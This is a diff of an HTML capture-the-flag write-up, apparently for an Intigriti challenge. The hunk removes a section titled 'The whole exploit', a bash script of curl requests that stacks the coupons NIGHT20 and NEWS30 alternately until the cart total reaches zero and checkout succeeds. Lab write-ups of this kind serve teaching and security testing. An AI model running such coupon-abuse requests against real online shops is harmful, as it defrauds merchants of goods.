@@ -485,28 +485,6 @@ server: istio-envoy
     <p>At zero, <code>canCheckout</code> flips to <code>true</code> and checkout goes through.
       Nothing stops you carrying on past that either. I stopped at 100% only because the box was
       already free.</p>
-
-    <h4>The whole exploit</h4>
-
-    <figure>
-      <div class="screen">
-        <div class="screen-bar"><span>bash</span><span>four coupon requests</span></div>
-<pre>C=$(mktemp)
-B=https://challenge-1026.challenges.intigriti.io
-
-curl -s -c $C <span class="s">"$B/api/session"</span> &gt; /dev/null
-curl -s -b $C -c $C -X POST <span class="s">"$B/api/cart/items"</span> -H <span class="s">'Content-Type: application/json'</span> -d <span class="s">'{"productId":"midnight-vault"}'</span> &gt; /dev/null
-curl -s -b $C -c $C -X POST <span class="s">"$B/api/newsletter"</span> -H <span class="s">'Content-Type: application/json'</span> -d <span class="s">'{"email":"a@b.co"}'</span> &gt; /dev/null
-
-<span class="k">for</span> code <span class="k">in</span> NIGHT20 NEWS30 NIGHT20 NEWS30; <span class="k">do</span>
-  curl -s -b $C -c $C -X POST <span class="s">"$B/api/cart/coupon"</span> -H <span class="s">'Content-Type: application/json'</span> -d <span class="s">"{\"code\":\"$code\"}"</span>
-<span class="k">done</span>
-
-curl -s -b $C -c $C -X POST <span class="s">"$B/api/checkout"</span> -H <span class="s">'Content-Type: application/json'</span> -d <span class="s">'{}'</span></pre>
-      </div>
-      <figcaption>Eight requests end to end, four of which are the exploit. No race window, no timing
-        dependency, no brute force &mdash; it succeeds deterministically on the first run.</figcaption>
-    </figure>
   </section>
 
   <!-- ============================================ -->
